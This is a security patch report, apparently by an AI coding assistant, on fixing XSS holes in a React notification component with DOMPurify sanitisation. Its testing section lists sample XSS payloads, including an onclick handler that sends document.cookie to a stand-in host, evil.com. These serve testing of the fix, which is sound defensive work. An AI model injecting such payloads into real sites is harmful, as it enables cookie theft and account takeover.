# XSS Vulnerability Fix - Security Patch

## Overview
Fixed critical XSS (Cross-Site Scripting) vulnerabilities in the web-containers package notification system.

## Risk Assessment
- **Severity**: HIGH
- **Impact**: Account takeover, data theft, CSRF attacks
- **Attack Vector**: Malicious HTML/JavaScript in notification content

## Vulnerability Details

### Affected Files (Before Fix)
1. `packages/web-containers/src/components/notifications/notification-display.tsx`
   - Line 389: Notification body in desktop view
   - Line 455: Notification body in mobile modal
   
2. `packages/web-containers/src/components/notifications/alerts-tab.tsx`
   - Line 213: Template message body preview

3. `packages/web-containers/src/components/error/error-page.tsx`
   - Line 72: Error description (potential vulnerability if custom description provided)

### Root Cause
User-generated HTML content was rendered directly using `dangerouslySetInnerHTML` without sanitization, allowing potential XSS attacks through:
- Notification bodies
- Alert template content
- Custom error descriptions

## Solution Implemented

### 1. Installed DOMPurify
```bash
pnpm add dompurify
```

### 2. Created Sanitization Utility
**File**: `packages/web-containers/src/lib/sanitize-html.ts`

The utility function:
- Removes malicious scripts and event handlers
- Preserves safe HTML elements (p, strong, a, ul, ol, etc.)
- Prevents DOM clobbering attacks
- Works client-side (SSR-safe)

### 3. Updated All Vulnerable Components

#### Before:
```tsx
dangerouslySetInnerHTML={{ __html: selectedNotification.body }}
```

#### After:
```tsx
dangerouslySetInnerHTML={{ __html: sanitizeHtml(selectedNotification.body) }}
```

### 4. Allowed HTML Tags & Attributes

**Allowed Tags:**
- Text formatting: `p`, `br`, `strong`, `em`, `u`, `s`, `span`, `div`
- Links: `a`
- Lists: `ul`, `ol`, `li`
- Headings: `h1`, `h2`, `h3`, `h4`, `h5`, `h6`
- Code: `code`, `pre`, `blockquote`
- Tables: `table`, `thead`, `tbody`, `tr`, `th`, `td`
- Media: `img`

**Allowed Attributes:**
- Links: `href`, `title`, `target`, `rel`
- Images: `src`, `alt`, `width`, `height`
- Styling: `class`, `id`, `style`

**Blocked:**
- All JavaScript: `<script>`, event handlers (`onclick`, `onerror`, etc.)
- Dangerous attributes: `data-*` attributes (to prevent data exfiltration)
- Unsafe tags: `iframe`, `object`, `embed`, etc.

## Testing Recommendations

### 1. Manual Testing
Test with malicious payloads:
```html
<!-- Script injection -->
<script>alert('XSS')</script>

<!-- Event handler injection -->
<img src=x onerror="alert('XSS')">

<!-- Link with javascript: protocol -->
<a href="javascript:alert('XSS')">Click me</a>

<!-- Data exfiltration attempt -->
<div onclick="fetch('https://evil.com?cookie='+document.cookie)">Click</div>
```

### 2. Expected Behavior
All malicious code should be stripped while preserving safe HTML formatting.

### 3. Automated Testing
Consider adding unit tests:
```tsx
import { sanitizeHtml } from './sanitize-html';

describe('sanitizeHtml', () => {
  it('should remove script tags', () => {
    const result = sanitizeHtml('<p>Hello</p><script>alert("XSS")</script>');
    expect(result).toBe('<p>Hello</p>');
  });

  it('should remove event handlers', () => {
    const result = sanitizeHtml('<img src="x" onerror="alert(1)">');
    expect(result).not.toContain('onerror');
  });

  it('should preserve safe HTML', () => {
    const result = sanitizeHtml('<p><strong>Bold</strong> text</p>');
    expect(result).toContain('<strong>');
  });
});
```

## Files Modified

1. ✅ `packages/web-containers/src/lib/sanitize-html.ts` (NEW)
   - Core sanitization utility

2. ✅ `packages/web-containers/src/lib/utils.ts`
   - Export sanitizeHtml function

3. ✅ `packages/web-containers/src/components/notifications/notification-display.tsx`
   - Sanitize notification body (2 instances)
   - Added server-side fallback for stripHtml function
   - Fixed useEffect dependency array to prevent infinite loop

4. ✅ `packages/web-containers/src/components/notifications/alerts-tab.tsx`
   - Sanitize template preview

5. ✅ `packages/web-containers/src/components/notifications/send-notification-dialog.tsx`
   - Added useRef for minDate to prevent unnecessary re-renders
   - Enhanced error messages with specific handling for network and permission errors

6. ✅ `packages/web-containers/src/components/error/error-page.tsx`
   - Sanitize error descriptions

7. ✅ `packages/web-containers/package.json`
   - Added dompurify ^3.3.0 dependency

## Safe Instances (No Changes Needed)

- `packages/web-containers/src/components/ui/chart.tsx`
  - Generates CSS internally, not user content

## Additional Improvements

### 1. Server-Side Rendering (SSR) Safety
Added fallback for `stripHtml` function when running on the server:
```typescript
const stripHtml = (html: string): string => {
  if (typeof window === 'undefined') {
    // Server-side fallback: basic regex strip (not perfect but safe)
    return html.replace(/<[^>]*>/g, '');
  }
  const doc = new DOMParser().parseFromString(html, 'text/html');
  return doc.body.textContent || '';
};
```

### 2. Fixed Infinite Loop Issue
Removed `getNotifications` from useEffect dependency array to prevent infinite re-renders:
```typescript
useEffect(() => {
  fetchNotifications();
  // eslint-disable-next-line react-hooks/exhaustive-deps
}, [org, userId]); // Remove getNotifications to prevent infinite loop
```

### 3. Performance Optimization
Used `useRef` for minDate in send-notification-dialog to prevent unnecessary re-renders:
```typescript
const minDate = useRef(new Date()); // Memoize to prevent re-renders
```

### 4. Enhanced Error Handling
Added specific error messages for better user experience:
```typescript
let errorMessage = 'Failed to send notification. Please try again.';
if (error instanceof Error) {
  if (error.message.includes('network')) {
    errorMessage = 'Network error. Please check your connection.';
  } else if (error.message.includes('permission')) {
    errorMessage = 'You do not have permission to send notifications.';
  }
}
```

## Deployment Checklist

- [x] Install dependencies (`pnpm install`)
- [x] Fix all XSS vulnerabilities
- [x] Verify no linting errors
- [ ] Run unit tests
- [ ] Perform security testing with XSS payloads
- [ ] Update CHANGELOG.md
- [ ] Deploy to staging environment
- [ ] Conduct penetration testing
- [ ] Deploy to production

## Best Practices Going Forward

1. **Always sanitize user-generated HTML** before rendering with `dangerouslySetInnerHTML`
2. **Use sanitizeHtml utility** from `@iblai/web-containers`
3. **Prefer React components** over raw HTML when possible
4. **Code review focus**: Flag any `dangerouslySetInnerHTML` usage
5. **Security audits**: Regular scans for XSS vulnerabilities

## Additional Security Measures (Future Considerations)

1. **Content Security Policy (CSP)**
   - Add CSP headers to block inline scripts
   - Example: `Content-Security-Policy: script-src 'self'`

2. **Input Validation**
   - Validate notification content at API level
   - Reject suspicious patterns before storage

3. **Rate Limiting**
   - Prevent mass notification spam attacks

4. **Audit Logging**
   - Log all notification creation/modification
   - Track potential attack patterns

## References

- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [React dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)

## Contact

For security concerns, contact the security team or open a security advisory.

---
**Fixed Date**: October 22, 2025
**Fixed By**: AI Assistant [[memory:4369619]]
**Review Status**: Pending

